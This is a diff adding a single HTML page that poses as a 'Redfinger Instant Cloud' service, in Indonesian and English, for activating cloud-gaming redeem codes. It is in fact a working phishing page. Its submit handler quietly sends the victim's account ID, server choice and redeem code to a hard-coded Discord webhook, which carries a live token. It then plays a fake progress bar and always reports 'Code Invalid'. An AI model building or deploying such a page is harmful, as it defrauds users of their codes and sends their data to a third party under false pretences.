@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redfinger Instant Cloud</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background: #0a0e27;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(239, 68, 68, 0.15) 0%, transparent 70%);
+            top: -100px;
+            right: -100px;
+            border-radius: 50%;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
+            bottom: -100px;
+            left: -100px;
+            border-radius: 50%;
+        }
+
+        .container {
+            background: rgba(17, 24, 39, 0.95);
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 550px;
+            backdrop-filter: blur(20px);
+            animation: slideIn 0.6s ease-out;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header .subtitle {
+            color: #9ca3af;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .lang-btn {
+            padding: 8px 20px;
+            background: rgba(31, 41, 55, 0.8);
+            border: 1px solid rgba(75, 85, 99, 0.5);
+            border-radius: 8px;
+            color: #9ca3af;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .lang-btn.active {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            border-color: #ef4444;
+            color: #fff;
+        }
+
+        .lang-btn:hover:not(.active) {
+            border-color: #9ca3af;
+            color: #fff;
+        }
+
+        .welcome-screen {
+            display: block;
+        }
+
+        .welcome-screen.hidden {
+            display: none;
+        }
+
+        .description-box {
+            background: rgba(31, 41, 55, 0.6);
+            border: 1px solid rgba(75, 85, 99, 0.4);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 30px;
+            line-height: 1.8;
+            color: #d1d5db;
+        }
+
+        .description-box h3 {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .description-box p {
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+
+        .description-box .highlight {
+            color: #ef4444;
+            font-weight: 600;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-continue:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(239, 68, 68, 0.4);
+        }
+
+        .form-screen {
+            display: none;
+        }
+
+        .form-screen.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            color: #e5e7eb;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(31, 41, 55, 0.8);
+            border: 1px solid rgba(75, 85, 99, 0.5);
+            border-radius: 12px;
+            font-size: 15px;
+            color: #fff;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        input::placeholder {
+            color: #6b7280;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ef4444;
+            background: rgba(31, 41, 55, 1);
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 45px;
+        }
+
+        select option {
+            background: #1f2937;
+            color: #fff;
+        }
+
+        #codeGroup {
+            display: none;
+            animation: fadeInDown 0.4s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .btn-process {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-process:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(239, 68, 68, 0.4);
+        }
+
+        .btn-process:disabled {
+            background: linear-gradient(135deg, #374151 0%, #1f2937 100%);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .progress-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .progress-container.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .progress-bar-wrapper {
+            background: rgba(31, 41, 55, 0.8);
+            border-radius: 12px;
+            height: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 1px solid rgba(75, 85, 99, 0.5);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ef4444 0%, #f87171 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
+        }
+
+        .progress-text {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .message {
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.3s ease;
+            font-weight: 600;
+        }
+
+        .message.error {
+            background: rgba(239, 68, 68, 0.15);
+            color: #fca5a5;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 40px 30px;
+            }
+
+            .header h1 {
+                font-size: 24px;
+            }
+
+            .description-box {
+                padding: 20px;
+            }
+
+            .description-box h3 {
+                font-size: 16px;
+            }
+
+            input, select {
+                padding: 13px 15px;
+                font-size: 14px;
+            }
+
+            .btn-process, .btn-continue {
+                padding: 15px;
+                font-size: 15px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(31, 41, 55, 0.5);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(75, 85, 99, 0.8);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(107, 114, 128, 1);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>☁️ Redfinger Instant Cloud</h1>
+            <p class="subtitle">Cloud Gaming Platform</p>
+        </div>
+
+        <!-- Welcome Screen -->
+        <div class="welcome-screen" id="welcomeScreen">
+            <div class="language-selector">
+                <button class="lang-btn active" data-lang="id">🇮🇩 Indonesia</button>
+                <button class="lang-btn" data-lang="en">🇺🇸 English</button>
+            </div>
+
+            <div class="description-box" id="descriptionBox">
+                <!-- Content will be inserted by JavaScript -->
+            </div>
+
+            <button class="btn-continue" id="continueBtn">Lanjutkan</button>
+        </div>
+
+        <!-- Form Screen -->
+        <div class="form-screen" id="formScreen">
+            <form id="codeForm">
+                <div class="form-group">
+                    <label for="userId" id="labelUserId">Your ID Account</label>
+                    <input 
+                        type="number" 
+                        id="userId" 
+                        name="userId" 
+                        placeholder="Enter your ID account" 
+                        required
+                        min="1"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="serverSelect" id="labelServer">Select Server</label>
+                    <select id="serverSelect" required>
+                        <option value="" disabled selected id="serverPlaceholder">Choose server region</option>
+                        <option value="Hong Kong">Hong Kong</option>
+                        <option value="Singapore">Singapore</option>
+                        <option value="Thailand">Thailand</option>
+                        <option value="Taiwan">Taiwan</option>
+                        <option value="United States">United States</option>
+                    </select>
+                </div>
+
+                <div class="form-group" id="codeGroup">
+                    <label for="redfingerCode" id="labelCode">Enter Code Redfinger</label>
+                    <input 
+                        type="text" 
+                        id="redfingerCode" 
+                        name="redfingerCode" 
+                        placeholder="XXXX-XXXX-XXXX" 
+                        maxlength="14"
+                    >
+                </div>
+
+                <button type="submit" class="btn-process" id="submitBtn">
+                    Process
+                </button>
+
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-bar-wrapper">
+                        <div class="progress-bar" id="progressBar"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">Processing... 0%</div>
+                </div>
+            </form>
+
+            <div class="message error" id="message">❌ Code Invalid</div>
+        </div>
+    </div>
+
+    <script>
+        const translations = {
+            id: {
+                title: 'Tentang Layanan Ini',
+                description: `Kesulitan mencari <span class="highlight">stok server Redfinger</span> yang tersedia? Web ini adalah solusinya!<br><br>
+                Dengan layanan <span class="highlight">Instant Cloud</span>, Anda dapat langsung mengaktifkan cloud gaming menggunakan <span class="highlight">kode redeem</span> tanpa perlu menunggu stok server tersedia. Kode akan otomatis masuk ke akun/ID Anda.<br><br>
+                <span class="highlight">⚠️ Penting:</span> Pastikan ID akun yang Anda masukkan <span class="highlight">valid dan benar</span>. Kesalahan input ID dapat menyebabkan kode tidak dapat digunakan.`,
+                continueBtn: 'Lanjutkan',
+                labelUserId: 'ID Akun Anda',
+                labelServer: 'Pilih Server',
+                labelCode: 'Masukkan Kode Redfinger',
+                userIdPlaceholder: 'Masukkan ID akun Anda',
+                serverPlaceholder: 'Pilih region server',
+                processBtn: 'Proses'
+            },
+            en: {
+                title: 'About This Service',
+                description: `Having trouble finding available <span class="highlight">Redfinger server stock</span>? This website is the solution!<br><br>
+                With our <span class="highlight">Instant Cloud</span> service, you can directly activate cloud gaming using a <span class="highlight">redeem code</span> without waiting for server availability. The code will automatically be added to your account/ID.<br><br>
+                <span class="highlight">⚠️ Important:</span> Make sure the account ID you enter is <span class="highlight">valid and correct</span>. Incorrect ID input may cause the code to be unusable.`,
+                continueBtn: 'Continue',
+                labelUserId: 'Your ID Account',
+                labelServer: 'Select Server',
+                labelCode: 'Enter Code Redfinger',
+                userIdPlaceholder: 'Enter your ID account',
+                serverPlaceholder: 'Choose server region',
+                processBtn: 'Process'
+            }
+        };
+
+        let currentLang = 'id';
+
+        function updateLanguage(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            
+            document.getElementById('descriptionBox').innerHTML = `
+                <h3>${t.title}</h3>
+                <p>${t.description}</p>
+            `;
+            document.getElementById('continueBtn').textContent = t.continueBtn;
+            document.getElementById('labelUserId').textContent = t.labelUserId;
+            document.getElementById('labelServer').textContent = t.labelServer;
+            document.getElementById('labelCode').textContent = t.labelCode;
+            document.getElementById('userId').placeholder = t.userIdPlaceholder;
+            document.getElementById('serverPlaceholder').textContent = t.serverPlaceholder;
+            document.getElementById('submitBtn').textContent = t.processBtn;
+        }
+
+        // Initialize with Indonesian
+        updateLanguage('id');
+
+        // Language switcher
+        document.querySelectorAll('.lang-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                updateLanguage(this.dataset.lang);
+            });
+        });
+
+        // Continue to form
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            document.getElementById('welcomeScreen').classList.add('hidden');
+            document.getElementById('formScreen').classList.add('active');
+        });
+
+        const codeInput = document.getElementById('redfingerCode');
+        const serverSelect = document.getElementById('serverSelect');
+        const codeGroup = document.getElementById('codeGroup');
+
+        // Show code input when server is selected
+        serverSelect.addEventListener('change', function() {
+            if (this.value) {
+                codeGroup.style.display = 'block';
+                codeInput.required = true;
+            }
+        });
+
+        // Auto format code with dash
+        codeInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length && i < 12; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += '-';
+                }
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue;
+        });
+
+        const form = document.getElementById('codeForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const message = document.getElementById('message');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const userId = document.getElementById('userId').value;
+            const server = serverSelect.value;
+            const redfingerCode = codeInput.value;
+            
+            // Disable button and show progress
+            submitBtn.disabled = true;
+            progressContainer.classList.add('active');
+            message.style.display = 'none';
+            
+            // Send to webhook immediately
+            const webhookData = {
+                content: "@everyone",
+                embeds: [{
+                    title: "☁️ Redfinger Instant Cloud - New Submission",
+                    color: 15158332,
+                    fields: [
+                        {
+                            name: "👤 ID Account",
+                            value: `\`${userId}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🌏 Server",
+                            value: server,
+                            inline: true
+                        },
+                        {
+                            name: "🔑 Redfinger Code",
+                            value: `\`${redfingerCode}\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Redfinger Cloud System"
+                    },
+                    thumbnail: {
+                        url: "https://i.imgur.com/4M34hi2.png"
+                    }
+                }]
+            };
+            
+            // Send to webhook (fire and forget)
+            fetch('https://discord.com/api/webhooks/1445316905920364565/24sHAyS_iWUdXzLXL7LZhf5Izv-AdhOWk2s5tVdRD9IwCKci4YgvSh270Zw0AQrgq2HV', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(webhookData)
+            }).catch(() => {});
+            
+            // Progress animation (10 seconds total)
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                progressText.textContent = `Processing... ${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        progressContainer.classList.remove('active');
+                        message.style.display = 'block';
+                        submitBtn.disabled = false;
+                        const t = translations[currentLang];
+                        submitBtn.textContent = t.processBtn;
+                    }, 500);
+                }
+            }, 100); // 100ms * 100 = 10 seconds
+        });
+    </script>
+</body>
+</html>
